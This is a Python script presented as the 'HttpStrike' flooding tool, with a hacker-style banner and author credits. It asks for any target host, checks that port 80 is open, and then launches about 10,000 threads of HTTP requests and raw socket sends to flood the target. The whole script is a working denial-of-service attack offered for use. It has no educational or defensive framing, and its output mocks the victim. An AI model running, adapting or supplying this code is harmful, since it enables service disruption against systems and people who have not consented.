#!/bin/python3

import os
import time
import socket
import requests
import threading
from datetime import datetime

useragent = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36"}

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

def start():
    os.system("clear")
    print(" _   _ _   _        ____  _        _ _        ")
    print("| | | | |_| |_ _ __/ ___|| |_ _ __(_) | _____ ")
    print("| |_| | __| __| '_ \___ \| __| '__| | |/ / _ \"")
    print("|  _  | |_| |_| |_) |__) | |_| |  | |   <  __/")
    print("|_| |_|\__|\__| .__/____/ \__|_|  |_|_|\_\___|")
    print("              |_|")
    print("")
    print("Author           : AngelDustSec")
    print("Tool-Name        : HttpStrike")
    print("Coded By         : K3ysTr0K3R, akrdonkdon")
    print("YouTube          : https://youtube.com/@Anonymous")
    print("GitHub           : https://github.com/K3ysTr0K3R    : https://github.com/akrdon")
    print("Instagram        : https://instagram.com/K3ysTr0K3R : https://instagram.com/akrdonkdon")
    print("")

def flood(target):
    try:
        req = requests.get(f"http://{target}:80/", headers=useragent)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target, 80))
        sock.sendto(req.content, (target, 80))
        sock.close()
    except requests.exceptions.ConnectionError:
        pass
    except OSError:
        pass
    except KeyboardInterrupt:
        print("\n[!] Exiting...")
        exit()

start()
target = input("[!] target? = ")
print(f"[i] Scan started at [{hour}:{minute}:{day}/{month}/{year}]")

try:
    start()
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = sock.connect_ex((target, 80))
    if connect == 0:
        start()
        print(f"[!] Connecting to {target}:80")
        print(f"[!] Connected to {target}:80")
        time.sleep(2)
        print("starting flood")
    else:
        print(f"[i] {target}:80 is closed")
        exit()
except KeyboardInterrupt:
    print("\n[i] user requested interrupt")
    print("[i] shutting down...")
    exit()
except socket.gaierror:
    print("[!] hostname not found")
    exit()
except socket.error:
    print("[!] could not connect to server")
    exit()

print("")
for _ in range(1,10000):
    threading.Thread(target=flood, args=(target,)).start()
    print(f"[+] Flooding {target} on port 80 for {_} tries [{hour}:{minute}:{day}/{month}/{year}] - G3T_F4CK3D")
